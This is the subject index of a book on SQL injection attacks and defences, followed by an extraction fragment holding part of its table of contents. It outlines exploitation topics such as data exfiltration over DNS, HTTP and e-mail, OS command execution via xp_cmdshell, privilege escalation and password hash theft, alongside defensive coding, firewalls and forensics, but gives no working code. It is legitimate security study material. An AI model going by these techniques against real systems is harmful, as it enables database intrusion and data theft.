\nadvantages, 269  \nGET_HOST function, 269–270 stored procedure, 271, 272 universal naming convention (UNC), 271 VARBINARY parameter, 271–272 xp_cmdshell  procedure, 270 \nzone attacker.com, 273 \nE-mail exfiltration, 273  \nHTTP exfiltration  \nHTTPURITYPE package, 273–274 Oracle function, 274–275 \nORDER BY clause, 275  \nICMP ex filtration, 276 \nclient -side SQL injection  \nattacking client -side databases, 356–358  \nlocal database, 355–356  \nCLR. See common language runtime (CLR)  \nCMS. See content management system (CMS)  \ncode -level defenses  \napplication program interfaces (APIs), 371  \ncanonicalization approaches  \nASCII equivalents, 397 \nframework, 398  \ninput normalization, 397  \ninput validity, 398  \nnormalization pr ocess, 397 \nworking with Unicode input, 397–399 \ndesign techniques  \navoiding obvious object names, 403–404  \ndatabase honeypots, 404 \nhandling sensitive data, 401–403 secure development resources, 404–405  \nusing abstraction layers, 400–401 \nusing stored procedures, 399–400 \ndomain driven security (DDS)  \nconcept, 366–368  \nlogin function, 366  \nencoding output, database, 387–396 Java database connectivity (JDBC), 372  \nNoSQL injection, 395–396 \nparameterized statements  \n.NET (C#), 373–376  \nadvantage, 371  \ndynamic string building, 371 \nHTML5 browser storage, 378–379 \nJava, 372–373 mobile apps, 377–378 PHP, 376–377  \nPL/SQL, 377  \nstatements, 372 \nsecure coding, 365 \nvalidating input  \n.NET, 386 blacklisting, 383–384  \nHTML 5, 387  \nJava, 384–386 mobile apps, 387 PHP, 386–387  \nwhitelisting, 379–383 \nCOLUMN privileges, 185–187 common l anguage runtime (CLR), 301–303  \nCommon Weakness Scoring System (CWSS), 9  \nconfirming and recovering SQL injection attack actions performed by  attacker during incident, \n474–475 \ndata involved assessment, 473–474 \ndynamic payloads, 479– 481 \nincident containment, 472–473 investigations  \ndigital artifacts, 446–472  \nforensically sound practices, 444–446  \nnotification of appropriate individuals, 474 payload of attack, 476–477 static payloads, 477–479  \nconfirming and ter minating SQL injection  \nBENCHMARK function, 75 comments  \nback -end server, 70  \ndatabase concatenation operators, 69, 70  \nexploitation, 68  \nmultiline comments, 68, 69 \ntesting string, 70  \ndatabase comment syntax, 65–67  \nDBMS_LOCK.SLEEP( ) function, 76 executing multiple statement \nAsprox Botnet, 73–74 \ndenial of service (DoS) attacks, 73 GET parameter, 72  \nGROUP BY technique, 71  \nserver -side cursors, 70  \ntesting string, 73  \nUNION statements, 71–72 UPDATE statement, 71  \nWHERE clause, 72 \ninline function \nnumeric values, 63–65  \nstrings, 59–63  \nnumbers and strings, 58– 59 \nstatement, 65 time delays, 74–76  \ntrial- and-error process, 58  \ncontent management system (CMS)  \nCMSUsers table, 8 login.php script, 7–8  \nPHP script, 3, 8 Web application, 7 \nCREATE PROCEDURE privilege  \ncursor injection, 202–203 \nSYS.KUPP$PROC, 203  \nweak permissions, 203–204 \ncross -site scripting (XSS), 77 \nD \ndatabase administrators (DBAs), 290, 359  \ndatabase -driven Web applications three -tier system, 2, 3 \ndatabase execution plan  \naccess execution plans, 458–461 limitations, 461–462  \nMicrosoft SQL Server, 458–459 MySQL, 459–460  \nobserve within cached execution plans, 455–458 Oracle, 459  \nPostgreSQL, 460–461  \ndatabase management system (DBMS), 290  \ndatabase queries  \ninference methods, 249  \nMySQL delays  \nBENCHMARK( ) function, 250–251 binary search inference exploits, 251–252  \nbit-by-bit inference exploits, 252 \nSLEEP( ) function, 250–251 \nOracle delays  \nalonso, 257 \nDBMS_LOCK package, 257 \nPostgreSQL delays  \nbinary search inference exploits, 254  \nbit-by-bit inference exploits, 254 \npg_sleep( )  function, 252–253 \nPL/pgSQL, 253  \nSQL Server delays  \nbinary search inference exploits, 256  \nbit-by-bit inference exploits, 256–257 \nWAITFOR DELAY keyword, 255  \ndatabase security  \napplication data, locking down \naudit trail maintenance, 428–431 least-privileged database login, 426  \noracle error triggers, 429 –431 \nPUBLIC permissions revoking, 427  \nsegregated database logins, 426–427 stored procedures, 427  \nstrong cryptography, 427 –428 \ndatabase server, locking down \nAd Hoc query restriction, 432 \nleast-privileged operating system account, 433  \npatched database server software, 433–434  \nSQL server/Oracle database server versions, 433 strengthen controls, 432– 433 \nsystem objects, 431–432  \ndatabase stored procedures, 371 DB2 cheat sheet  \nblind SQL  injection functions, 526, 527 \ndatabase configuration information and schema, 525 \nDBAs. See  database administrators (DBAs)  \nDBMS_LOCK.SLEEP(  ) function, 76 \nDDS. See domain driven security (DDS)  \ndeployment considerations  \nnetwork access control configuration, 439 unnecessary information leakage  \nconfiguration techniques , 435 \nDNS lookups, dummy host names, 436–437 empty default web site, 436 HTML noindex  Meta Tag, 437  \nsearch engine hacking, limit discovery, 437–438  \nsuppress error messages, 434–436 \nWeb Services Description Language (WSDL) information, 438 wildcard SSL certificates, 437 \nweb and database servers, separate hosts, 439 web server logs, verbosity, 438–439  \ndesign techniques  \nabstraction layers, 399–40 0 \navoiding obvious object names, 403–404  \ndatabase honeypots, 404 handling sensitive data  \ndatabase, 401–403  \nincident response, 402  \nsecure development resources  \nnotable projects, 405  \nred-database -security, 405 \nstored procedures  \naccess control, 399  \nweb application, 400  \ndigital artifacts  \ndatabase execution plan  \naccess execution plans, 458–461 limitations, 461–462  \nMicrosoft SQL Server, 458–459 \nMySQL, 459–460  \nobserve within cached execution plans, 455–458 Oracle, 459  \nPostgreSQL, 460–461  \ndatabase object timestamps  \nMicrosoft SQL Server, 469 MySQL, 470–471  \nOracle, 469–470  \nPostgreSQL, 471–472  \ntransaction log  \nanalysis, 463–468  \nMicrosoft SQL Server, 463–465 MySQL, 466–468  \nOracle, 465–466  \nPostgreSQL, 468  \nWeb server log files, 446 –452 \nDNS. See domain name system (DNS)  \ndomain driven security (DDS)  \nconcept, 336–337  \nlogin function, 366  \ndomain name system (DNS), 436–437 \ndynamic link library (DLL), 313–314  \ndynamic query, 371  \ndynamic string building techniques  \nbuilt-in command, 16 \nerror handling, 18–19  \nescape characters handling, 14–15  \nhandling types, 15–17  \nidiosyncrasies of, 15  \nmultiple submissions handling, 19–21  \nparameterized queries, 13 –14 \nPHP code, 14 \nquery assembly handling, 17–18 \nstring -building techniques, 13–14 \nE \ne-commerce appl ication, 2, 6 \nE-mail \nexfiltration, 273  \nMicrosoft SQL Server  \ndatabase Mail account, 213–214 e-mailing subsystems, 211–212 \nprocedure, 213–214  \nsp_send_dbmail , 213 \nOracle, 214–215  \nenterprise security application program interface (ESAPI), 385  \nexploit technique s \narbitrary data, 167, 168  \nautomated exploitation  \nBobcat, 225–226  \nBSQL, 226–227  \nother tools, 227–228 \nsqlmap, 224–225 \nblack -box attack approach, 140 \nconditional statements  \ncontent -based approach, 165 \ndatabase server technologies, 159  \nerror -based approach, 163–165 \nmethods, 158–159 time-based approach, 159–163 \ndatabase schema enumeration  \nMySQL, 178–183  \nOracle, 184–188  \nPostgreSQL , 183–184  \nSQL Server, 175–178  \ndatabase server  \nblind fingerprint, 149–150 \ninternet information server (IIS), 143–144  \nnon-blind fingerprint, 144–149 \ne-commerce application, 141 \nerrors  \napplication error, 169  \ngeneric error message, 170 GROUP BY clause, 170  \nhybrid attacks, 169  \ntrigger, 169  \nverbose error messages, 168 \nescalating privileges  \nbrute -force approach, 198–199 \nCREATE PROCEDURE privilege, 202–204  \nOracle, 200–202  \nSQL Server, 194–200  \nHTML code, 141 \ninjecting into “insert” queries  \nASCII( ) function, 191  \nCASE clause, 192  \nCONCAT function, 190 corrupt production data, 188 \nData Manipulation Language (DML), 188  \ngenerating insert errors, 191–193 \ninserting user determined data, 188–191  \nother scenarios, 193–194  \nscalar subqueries , 192 \nmobile devices  \nAndroid- based devices, 219–220 \nContent Providers, 219–221 inter process communication (IPC), 219–220  \nselId  parameter, 222  \nsqlite_master  table, 222 \nWebContentResolver application, 220, 221–222 \nOracle error messages  \naccess control list (ACL) system, 173  \nconcat  function, 171  \nerror -controllable messages, 173  \nmultiple rows, 173 output approaches, 173  \nSELECT statement, 171  \nSQL*Plus command line, 171 stragg (11g+) , 173  \nutl_inadd, 170  \nutl_inaddr.get_host_name  function, 171  \nOracle from Web applica tions, 142–143 \nout-of-band communication \nE-mail, 211–215 \nfile system, 215–219  \nHTTP/DNS, 215 \npassword hashes  \nhash modification, 205 \nMySQL, 206  \nOracle, 207–211  \nPostgreSQL, 206–207  \nSQL Server, 204–206  \nstacked queries, 142–143  \nstrings, 165–167  \nUNION statement s \ndata types, 153–158  \nmatching columns, 151–153 \nsyntax, 150–151 \nvictim.com, 141–142 vulnerable parameters, 140 \nexploitation  \nautomated techniques  \nabsinthe, 276–278 \nBSQL hacker, 278–280  \nSQLBrute, 280–282  \nsqlninja, 283–284 squeeza, 284–286  \nchannels  \ndatabase connections, 267–269 \nDNS exfiltration, 269–273  \nE-mail exfiltration, 273  \nHTTP exfilt ration, 273–276  \nICMP exfiltration, 276 \nclient -side SQL injection  \nattacking client -side databases, 356–358  \nlocal database, 355–356  \nfinding and confirmation  \nblind SQL injection techniques, 239–249 forcing generic errors, 235 injecting queries, 235  \nspitting and balancing, 235–237 subquery placeholders, 238 \nresponse -based techniques  \nMySQL, 259–260  \none bit information, 264–267 \nOracle, 263–264  \nPostgreSQL, 260–261  \nSQL Server, 261–263  \ntime-based techniques  \ndatabase queries, 249–257 inference considerations, 257–258 \nF \nfinding and confirmation  \nblind SQL injection techniques  \nchannel techniques, 249  \ninference techniques, 239–243 \nscenarios, 237–239  \nforcing generic errors, 235 four-tier architecture, 5–6 \ninjecting queries, 235  \nspitting and balancing \nauthor  parameter, 236  \nid parmeter, 235–236  \nstring parameter, 236–237 \nG \nGET parameters, versus POST parameters, 7  \nGET request, 17  \nH \nHTML5 communities, 13 \nHTTP exfiltration  \nHTTPURITYPE package, 273–274 \nOracle function, 274–275 \nORDER BY clause, 275  \nhybrid attacks  \ncross -site scripting (XSS), 358–359 \nexploiting authenticated vulnerabilities, 360–361 leveraging captured data, 358 \noperating system commands, Oracle, 359–360  \nI \nICMP exfiltration, 276 inference techniques  \nASCII( ) function, 244  \nbitstring, 248 bitwise operations, 247 extracting data method, 243–244 one bit informati on, 239 \nSQL Server database, 240 status parameter, 242  \nSUBSTRING( ) function, 242–243 \nT-SQL, 247  \nInformix cheat sheet  \nblind SQL injection functions, 527–528 database configuration information and schema, 526 \nIngres cheat sheet  \nblind SQL injection functions, 528–529 database configuration informa tion and schema, 528, 529 \nInjection flaws. See  SQL injection flaws  \ninline function \nnumeric values  \nexploitation, 64  \nprinciples, 65 single -quote delimiters, 64 \nuid parameter, 63  \nunique identification, 63 visual representation, 64 \nstrings  \nfinding process, 60  \nOR condition, 61 SQL statement, 59–63  \nUnclosed quotation markerror, 61  \ninput filters  \nbypassing custom filters, 347–348 \ncase variation, 340  \ncomments, 340–341 \ndynamic query execution, 342–345 non-standard entry points, 348–350 \nnull bytes, 345  \nsearch Query referers, 349 \nSQL injection attacks, 340 stripped expressions, 345–346 \ntruncation, 346–347 \nUnicode encodings, 343  \nURL encoding, 341–342  \ninput validation \n.NET, 386 blacklisting, 383–384  \nHTML5, 387  \nJava \ndefaultvalidator , 385  \nJava server faces (JSF), 384–385 \nmobile apps , 387 \nPHP, 386–387  \nwhitelisting  \nbinary blob, 380  \nluhn formula, 379 \nknown value validation, 380–383 \nintercepting filters  \napplication filters  \nJ2EE filter class, 420–421 secure parameter filter (SPF), 420–421  \nfiltering web service messages, 422  \nscripting languages, filter pattern, 421–422  \nweb server filters  \napplication program interface (API), 417–418  \nUrlScan, 419  \nWebKnight, 419–420  \nInternet information server (IIS), 334  \nIntrusion detection systems (IDSs), 345, 424–425 \nJ \nJava applications  \ncoding behavior recognition, 97–98 dangerous functions, 102 data process, 109–110  \nJava database connectivity (JDBC), 102, 372  \nK \nkeyword- blocking filter, 340 \nM \nMail Transfer Agents (MTA), 273  \nMicrosoft access databases, 530–531 \nMicrosoft code analysis tool .NET (CAT.NET), 131–132 Microsoft SQL Server  \ndatabase  \nO’Boyle string, 391  \npreceding characters, 392–393 \ntransact -SQL code, 391 \nwildcard character, 392– 393 \nencoding output, database, 390–393 execution plan, database, 458–459 object timestamps, database, 469  \noperating system commands  \n.NET binary, 321  \nipconfig command, 318–319 surface area configuration, 319 xp_cmdshell , 318–319  \nreading files  \n.NET binary, 301  \nActiveX control, 300–301 \nALTER ASSEMBLY  command, 303 \nbulk insert method, 297 common language runtime (CLR), 301–303  \ncommunication mechanism, 299 CREATE ASSEMBLY  function, 302 \ndomain name system (DNS), 296–297 file system object, 300–301 net.exe, 299 OLE automation, 300 \nquery analyzer, 298  \nRDBMS, 297 \nremote file servers, 299  \nscripting.filesystemobject, 300–301 security development lifecycle (SDL), 296–297  \nstolen -boot.ini, 299–300 \nSYSADMIN group, 304 \nunion query, 297  \ntransaction log, 463–465  \nwriting files  \nbinary files, 310 \nbulk copy program (BCP), 311 \ncsc.exe, 314–315  \nDOS copy  command, 311–312 \ndynamic link library (DLL), 313–314  \necho commands, 312  \nfile compiling, 314–315  \nfilesystemobject , 310  \nmeterpreter, 313–314  \nremote database server, 312–315 \nsp_oacreate , 310  \nUNIX, 312–313  \nworms, 312 \nMicrosoft SQL server cheat sheet  \nblind SQL injection functions, 504 database configuration information and schema, 500–504 database server attacking  \ncracking database passwords, 507 file read/write, 508  \nserver 2005 hashes, 507– 508 \nxp_cmdshell, 506–507  \nOPENROWSET reaut hentication attack, 505–506  \nserver privilege escalation, 504–506 \nmssql_execute( ) and odbc_prepare( ), 105–106  \nMySQL  \nadministrative privileges, 178 \ndatabase  \nstored procedure code, 393–394 string terminator, 393–394 wildcards, 394  \ndatabase schema enumeration, 178–183 delays in database queries, 250–252 E-mail system, 211–214  \nencoding output, database, 393–394 execution plan, database, 459–460 \nfile system, 218–219  \nhierarchical approach, 178 INTO OUTFILE, 218, 219 MYD files, 183  \nmysql  and information_schema, 178, 179  \nobject timestamps, database, 470–471  \noperating system commands  \nASP.NET, 318 Hackproofing, 318  \nWAMP Environments, 318  \nout-of-band communication, 211–214 \noutput tables, 182 \npassword hashes, 206  \nPASSWORD( )  function, 206 \nreading files  \nbinary files, 295, 296  \ndatabase, 292  \nDEBUG message, 292  \nhackproofing, 295  \nHEX( ) function, 295 LOAD DATA INFILE command, 291 LOAD_FILE  function, 292, 295–296 \nNGS Software, 295  \nqueries, 294  \nremote file syste m, 295  \nsubstring function, 296  \ntext file, 291–292  \nunion statement, 292–294 universal naming convention (UNC), 296 vulnerable intranet application, 293 \nresponse -based techniques, 259–260 \ntransaction log, 466–468  \nwriting files  \napache.org, 309  \nbinary files, 308 \nbuilt-in function, 308 \ndumpfile , 307–308 \nhackproofing, 310  \nLOAD DATA INFILE command, 307 \nUNHEX( ) , 308  \nuser-defined function (UDF), 310  \nMySQL cheat sheet  \nblind SQL injection functions, 508 database configuration information and schema, 508 database server attacking  \ncracking database passwords, 510 database directly attacking, 510–511  \nfile read, 511  \nfile write, 511  \nsystem command execution, 509–510 \nO \nopen Web application security project (OWASP), 405 Operating system exploitation  \nconsolidating access, 333 –335 \ndatabase programmers, 289 \nexecuting commands  \nMicrosoft SQL Server, 318–322 \nMySQ L, 318  \nOracle, 322–330  \nPostgreSQL, 330–333  \nfile system accessing  \nreading files, 290–306  \nwriting files, 306–317  \nOracle  \ncolumns and data type, 185 components  \nAPEX, 209 \nOracle internet directory (OID), 209–211  \nconcept, 201  \ndata encryption standard (DES) password hashes, 207 \ndatabase  \ndbms_assert , 390 \nO’Boyle, 389  \npreceding functions, 390 \nquote character, 390  \ndatabase schema enumeration, 184–188 database server, 214  \nDBA privileges, 201  \ndelays in database queries, 257 \nE-mail system, 214–215  \nencoding output, database, 388–395 escalating privileges, 200 –202 \nexecution plan, database, 459 file system, 219  \nmixed -case characters, 207 \nmultiple databases, 184  \nobject timestamps,  database, 469–470  \noperating system commands  \nalter system, 329 \nbuffer overflow, 329  \ncode execution via direct access, 325–330 custom application code, 329–330 \nDBMS_SCHEDULER, 326–327 EXTPROC, 325–326 Java, 326 PL/SQL native, 327–328  \nPL/SQL native 9i, 329  \nprivilege escalation, 322–325 \nSYSDBA privileges, 330  \ntext, 328–329  \nout-of-band communication, 214–215 \npassword hashes, 207–211 \nPL/SQL code, 200–201  \nprivilege types, 185–186  \nreading files  \naccess files, 304  \nJava, 304–306 select  statements, 305  \nutl_ file_dir  database, 304, 306 \nresponse -based techniques, 263–264 \nSYS.DBMS_CDC_PUBLISH, 202  \nSYS.LT, 201–202  \ntransaction log, 465–466  \nwriting files  \nbinary code, 315 \nDBMS_ADVISOR , 315  \nJava, 315–316 methods, 315 \nOracle cheat sheet  \nblind SQL injection functions, 511, 513 database configuration information and schema, 511, 513 \ndatabase server attacking  \ncommand execution, 513–514 \ncracking database passwords, 516–517 PL/SQL reading local files, 514–515 PL/SQL writing local files, 515–516 reading local files, 514 \nOracle PL/SQL and Microsoft Transact -SQL (T -SQL) code  \nauthid clause, 118–119 built-in database, 118–119 \ndata definition language (DDL) statements, 119–120 database administrators (DBAs), 121  \nEXEC( ), 123  \nEXECUTE function, 121 –122 \ninformation_schema database, 126  \nLIKE statement, 120  \nsp_helptext , 123 \nSQL Server 2008 database, 125 stored procedures, 123–125 user-controlled data, 121  \nP \nparameterized statement  \n.NET (C#)  \nADO.NET framework, 373–374 \nOleDbClient, 375 \nHTML5 browser storage  \nWeb SQL Database specification, 378 Web Storage Specification, 379 \nJava \nhibernate, 373  \nJDBC framework, 372  \nmobile apps  \nAndroid applications, 378 iOS applications, 377–378 \nPHP \ndata objects, 376  \nPDO package, 376–377  \nPL/SQL, 377  \npattern -matching filters, 340–341 \npayment card industry data security standards (PCI -DSS), 402–403 \nPHP applications  \n$input variable, 108, 109  \n$sql variable, 107  \nawk function, 105  \ngrep strings, 106 \nmssql_execute( ) and odbc_prepare( ), 105–106  \nuser-controlled data, 108, 109 \nplatform -level defenses  \nApplication Intrusion Detection Systems (IDSs), 424–425 \nAspect -oriented Programming (AOP), 424  \ndatabase firewall, 425 \nintercepting filters  \napplication filters, 420–421 filter pattern, scripted languages, 421–422  \nfiltering web service messages, 422  \nweb server and application filters, 417–420 \nnon-editable versus editable input protection, 422 \nruntime protection technologies and techniques  \ncode changes, 410  \nCommercial off -the-shelf (COTS) applications, 410 \nURL/page -level strategies  \nHTTP Handler configuration, 423 page overriding, 423  \nresource p roxying/wrapping, 424  \nsubstitute servlet configuration, 423 \nURL rewriting, 423–424  \nweb application f irewall (WAF), 411–417  \ngeneric attacks rule file, 413 \nModSecurity, 411–417  \nSecRule, generic syntax, 411–412 \nPostgreSQL  \nadministrative privileges, 206 database  \npq_escape_string( ), 394  \nstring terminator, 394  \ndatabase schema enumeration, 183–184 delays in database queries, 252–254 encoding output, database, 394–395 execution plan, database, 460–461 \nhierarchical approach, 183 ILIKE clause, 184  \nMD5, 207 object timestamps, database, 471–472  \noperating system commands, 330–333 password hashes, 206–207 reading files  \nCOPY function, 306 ‘/etc/passwd’ file, 306 \nresponse -based techniques, 260–261 \ntransaction log, 468  \nwriting files  \nCOPY function, 316 \nPHP programing language, 316 sqlmap suppor ts, 317 \nsuper user privileges, 316 \nPostgreSQL cheat sheet  \nblind SQL injection functions, 518 database configuration information and schema, 517–518 \ndatabase server attacking  \ncracking database passwords, 519–520 local file access, 519  \nsystem command execution, 519 \nR \nRelational database management system (RDBMS), 297 response -based techniques  \nMySQL  \nFALSE inference, 259  \nTRUE inference, 259  \nWeb application, 259 \none bit information \nbinary search method, 266–267 \nCASE statement, 265–266 \nOracle  \nCAST( ), 264 \nkey bits, 263  \nPostgreS QL \nerror management, 261  \nPAUSE( ) function, 261  \nSQL Server  \nASP.NET, 262–263 CASE statement, 263 \nreviewing source code  \n$param, 90–91  \nAndroid application code  \nContent -Providers, 111–112, 115, 116 \nSQLiteDatabase, 112–114 SQLiteQueryBuilder, 112–114 sqlmap, 112–114 WebContentResolver, 112 \nautomated tools  \nabstract syntax tree (AST), 127 AppCodeScan, 130  \nAppScan Source Edition, 135 \nCodePro AnalytiX, 132  \nCodeSecure, 135  \ncommand -line utilities, 126–127 \ncontrol flow graph (CFG), 127 \nKlocwor k Solo, 135–136 \nlexical analysis, 127  \nMicrosoft analyzer, 131  \nMicrosoft code analysis tool .NET (CAT.NET), 131–132 \nmysql_query( ) function, 127 OWASP LAPSE+ project, 130–131 PHP scripts, vulnerabilities in, 132 Pixy, 129–130  \nRIPS, 132 source code analyzers (SCAs), 133–134 static analysis, 134–135 Teachable Static Analysis  Workbench (TeSA), 132–133 \nyet another source code analyzer (YASCA), 129  \ncoding behavior recognition \nbuild and execute statements, 92–93 C# applications, 98–99 dynamic string -building techniques, 92  \nEXECUTE function, 93, 94 \nHTML form, 95 \nHTTP headers, 95  \nJava application, 97–98 \nMETHOD attribute, 95  \nOracle stored procedures, 94 PHP function and code, 96 \nstring concatenation, 92 user-controlled input, 94 –95 \ndangerous functions  \nC#, 103–104 Java application, 102 java.sql, 102 \nPHP scripting language, 99–102 \nvulnerable applications, 99 \ndata process  \nC#, 110–111 grep tool, 104 integrated develop ment environment (IDE), 104  \nJava, 109–110 PHP, 104–111  \ndynami c code analysis, 89–90 \nmethodical approach, 90  \nmethods, 89–90 \nPHP code, 90–91 PL/SQL and T -SQL code  \nauthid clause, 118–119 built-in database, 118–119 \ndata definition language (DDL) statements, 119–120 database administrators (DBAs), 121  \nEXEC( ), 123  \nEXECUTE function, 121 –122 \ninformation_schema database, 126  \nLIKE statement, 120  \nsp_helptext , 123 \nSQL Server 2008 database, 125 stored procedures, 123–125 user-controlled data, 121  \nsecurity -sensitive function, 90 \nsinks, 92 static code analysis, 89–90  \nuser-controlled data, 91  \nROLE privileges, 185–187 \nS \nsanitizing filters,  345, 346 \nSAP MAX DB (SAP DB), 15 \nsecond -order SQL injection  \naddress book application, 350–352 bugs, 354  \nHTTP request and response, 350 second -order vulnerabilities, 352–355 \nSecure sockets layer (SSL), 437  \nsimple mail transfer protocol (SMTP), 273 simple object access protocol (SOAP), 334–335  \nSQL injection flaws, 12 SQL injection vulnerabilities  \nCMS application, 7–8 dynamic string buildin g \nbuilt-in command, 16 \nerror handling, 18–19  \nescape characters handling, 14–15  \nhandling types, 15–17  \nidiosyncrasies of, 15  \nmultiple submissions handling, 19–21  \nparameterized queries, 13 –14 \nPHP code, 14 query assembly handling, 17–18 \nstring -building techniques, 13–14 \ne-commerce application, 2, 6 \nGET versus POST parameters, 7  \nhigh-profile Web sites  \nCommon Vulnerabilities and Exposures (CVE), 9 –10 \nhacking Web applications, 11–12 \nmalicious script, 12 script kiddies, 12 \nHTTP -delivered enterprise ap plications, 6  \ninsecure database configuration  \nbuilt-in stored procedures, 21 \ncommands, 22 \ndatabase administrator (DBA) privileges, 22–23  \ndatabase metadata, 22  \nOracle, 22–23  \nSYSTEM privileges, 21  \nlogin.php script, 8  \nMySQL database, 23  \nparsing and execution, 6  \nprogramming languages, 13 \nWeb applications works  \ndatabase -driven, 2  \nfour-tier architecture, 5–6 \nPHP script, 3 \nthree- tier architecture, 4–5 \nSQL Server  \nbrute -force mode, 197  \ncolumns, 176 database schema enumeration, 175–178 database table extraction, 218 delays in database queries, 254–257 e-commerce application, 175 \ne-shop database, 176  \nescalating privileges, 194 –200 \nfile system  \n–U and–P parameters, 218 \nbcp.exe, 217 password hash, 216–217  \nqueryout  parameter, 217  \nsql_logins  table, 216 \nfn_varbintohexstr( ) , 205  \nOPENROWSET  command, 194–195 \nout-of-band communication, 216–218 \npassword hashes, 204–206 \npwdencrypt( ) , 204  \nremote database server, 175 \nresponse -based techniques, 261–263 \nserver file system, 216 sp_addsrvrolemember  procedure, 195  \nsysxlogins  table, 205 \nUNION SELECT , 177  \nunpatched servers, 199–200 WAITFOR DELAY, 197  \nsqlmap  \ncommand -line automation, 224 \npar excellence, 224  \nPython, 224–225  \nsqueeza, 284–286  \nSSL. See Secure sockets layer (SSL)  \nstructured query language (SQL) primer  \nbypassing input validation filters  \nHTTP encoding, 521, 522 quote filters, 520–521 \nDB2 cheat sheet  \nblind SQL injection functions, 526, 527 database configuration information and schema, 526 \nInformix cheat sheet  \nblind SQL injection functions, 527–528 \ndatabase configuration information and schema, 527 \nIngres cheat  sheet  \nblind SQL injection functions, 528–529 database configuration information and schema, 528, 529 \ninjection  \ncombine multiple rows and columns, 499 database platform identification, 495–497 vulnerabilities, 492–495 \nmaterials resources  \ncheat sheets, 531 \nexploit tools, 531–532  \npassword cracking tools, 532 \nwhite papers, 531  \nMicrosoft SQL server cheat sheet  \nblind SQL injection functions, 504 database configuration information and schema, 500–504 database server attacking, 506–508 microsoft SQL server privilege escalation, 504–506 OPENROWSET reauthentication attack, 505–506  \nMySQL cheat sheet  \nblind SQL injection functions, 508 \ndatabase configuration information and schema, 508 database server attacking, 508–511 \nOracle cheat sheet  \nblind SQL injection functions, 511, 513 database configuration information and schema, 511, 513 database server attacking, 511–517 \nPostgreSQL cheat sheet  \nblind SQL injection functions, 518 database configuration information and schema, 517, 518 database server attacking, 518–520 \nSQL queries  \nALTER TABLE statement, 490 CREATE TABLE statement, 488–490 DELETE statement, 488  \nDROP statement, 488 GROUP BY statement, 490 INSERT statement, 487– 488 \nORDER BY clause, 490 –491 \nresult set limitation, 491– 492 \nSELECT statement, 486 –487 \nUNION operator, 487  \nUPDATE statement, 488  \nSybase cheat sheet  \nblind SQL injection functions, 530 \ndatabase configuration information and schema, 529, 530 \ntroubleshooting SQL injection attacks, 521–525  \nSUBSTRING( ) function, 242–243 Sybase cheat sheet  \nblind SQL injection functions, 530 database configuration information and schema, 529, 530 \nSYSTEM privileges, 185 –187 \nT \nTABLE privileges, 185– 187 \nTCP. See transmission control protocol (TCP)  \ntesting and inference  \napplication response  \nback -end database, 49  \ndifferent inputs, 53–54  \ngeneric errors, 49–52  \nHTTP code errors, 52–53  \nautomating discovery  \ndatabase error, 76 \nGET and POST requests, 76 \nHP Scrawlr, 80–82  \nHP WebInspect, 77–79 \nIBM Rational AppScan, 79–80 \nParos Proxy, 83–85  \nSQLiX, 82–83  \ntasks, 76 Zed Attack Proxy, 83–85  \nblind injection detection, 54–58 confirming and terminating \nback -end server, 70  \nBENCHMARK function, 75 database comment syntax, 65–67  \ndatabase concatenation operators, 69, 70  \nDBMS_LOCK.SLEEP( ) functi on, 76 \nexecuting multiple statement, 70–74 exploitation, 68  \ninline function, 59–65 multiline comments, 68, 69 \nnumbers and strings, 58– 59 \nstatement, 65 testing string, 70  \ntime delays, 74–76  \ntrial- and-error process, 58  \nVictim Inc, 67 \ndatabase errors  \nMicrosoft SQL Server, 38 –42 \nMySQL, 42–45  \nOracle, 45–47  \nPostgreSQL, 47–49  \ntriggers, 37  \nGET requests, 29  \ninformation workflow, 35  \ninjectable data, 31–32  \nmanipulating parameters, 32–35 \nPOST requests, 29–31 \nTrigger anomalies, 28  \nthree- tier architecture, 4–5 \ntiered architecture, basic concept of, 5–6  \ntime-based techniques  \ndatabase queries  \nmethods, 249 MySQL delays, 250–252  \nOracle delays, 257  \nPostgreSQL delays, 252– 254 \nSQL Server delays, 254– 257 \ninference considerations, 257–258 \ntransaction log  \nanalysis, 463–468  \nMicrosoft SQL Server, 463–465 \nMySQL, 466–468  \nOracle, 465–466  \nPostgreSQL, 468  \ntransmission control protocol (TCP), 267, 296–297 troubleshooting SQL injection attacks, 521–525  \nU \nUNION statements  \ndata types  \nback -end database, 156  \nbrute -force guessing, 153–154 \ncast operators, 156  \ninteger and string, 154  \nlooping statement, 158  \nmultiple data, 155 NULL clause, 153  \nSELECT queries, 156 system_user and db_name( ), 155  \nWHERE clause, 157 \nmatching columns  \ndatabase server technology, 151  \nORDER BY clause, 152 –153 \nproducts.asp, 152  \nrequirements, 151  \nsyntax, 150–151 \nuniversal naming convention (UNC), 296 \nuser datagram protocol (UDP), 312 user-defined function (UDF), 310, 330  \nuserid , 8 \nV \nvirtual private database (VPD), 404 \nW \nWeb application firewalls (WAF), 339–340  \nHTTP/HTTPS, 411  \nModSecurity  \nconfigura ble rule set, 411 –414 \ngeneric attacks rule file, 413 intrusion detection capabilities, 416–417  \nrequest normalization, 415–416 REQUEST variables and coverage, 414–415  \nresponse analysis, 416  \nSecRule, generic syntax, 411–412 \nSQL errors leakage rule, 416 \ntransformation functions, 415 Whitelist rule, 414  \nWeb applications  \ncontent management system (CMS), 8 CVE requests, 9–10  \ndatabase -driven, 2  \ne-commerce application, 2 \nfour-tier architecture, 5–6 \nhybrid attacks  \ncreating cross -site scripting (XSS), 358–359 \nexploiting authenticated vulnerabilities, 360–361 leveraging captured data, 358 operating system commands, Oracle, 359–360  \ninput filters  \nbypassing  custom filters, 347–348 \ncase variation, 340  \ncomments, 340–341 dynamic query execution, 342–345 non-standard entry points, 348–350 \nnull bytes, 345  \nsearch Query referers, 349 \nSQL injection attacks, 340 \nstripped expressions, 345–346 truncation, 346–347 Unicode encodings, 343  \nURL encoding, 341–342  \nOWASP lists injection, 9 –10 \nPHP script, 3 programming languages, 13 \nRDBMS, 19 three- tier architecture, 3–5 \nWeb environment, 27–28 \nWeb in frastructure configuration, 439–440 \nWeb server and application filters, 417–420 Web Services Description Language (WSDL), 438 \nX \nXSS. See cross -site scripting (XSS)  \nZ \nZone -H, 10  ",
  "normalized_text": "sql injection attacks and defense second edition justin clarke table of contents cover image title page copyright acknowledgements dedication contributing authors lead author and technical introduction to the 2nd edition chapter 1. what is sql injection? introduction understanding how web applications work understanding sql injection understanding how it happens sum mary solutions fast track chapter 2. testing for sql injection introduction finding sql injection confirming sql injection automating sql injection discovery summary solutions fast track chapter 3. reviewing code for sql injection introduction reviewing source code for sql injection automated source code review summary solutions fast track chapter 4. exploiting sql injection introd uction understanding common exploit techniques identifying the database extracting data through union statements using conditional statements enumerating the database schema injecting into “insert” queries escalating privileges stealing the password hashes out-of-band communication sql injection on mobile devices automating sql injection 